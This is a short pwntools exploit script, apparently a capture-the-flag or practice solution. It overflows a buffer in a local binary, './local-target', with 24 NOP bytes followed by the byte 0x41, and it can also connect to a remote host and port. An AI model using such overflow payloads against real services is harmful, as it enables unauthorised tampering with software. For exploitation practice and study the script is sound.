from pwn import * 
import os 

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a , **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './local-target'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

padding = 24

p = flat([
    asm('nop') * padding,
    0x41 # 65 
])

sh.sendlineafter(b':', p)

get = sh.recvall()
info(get)
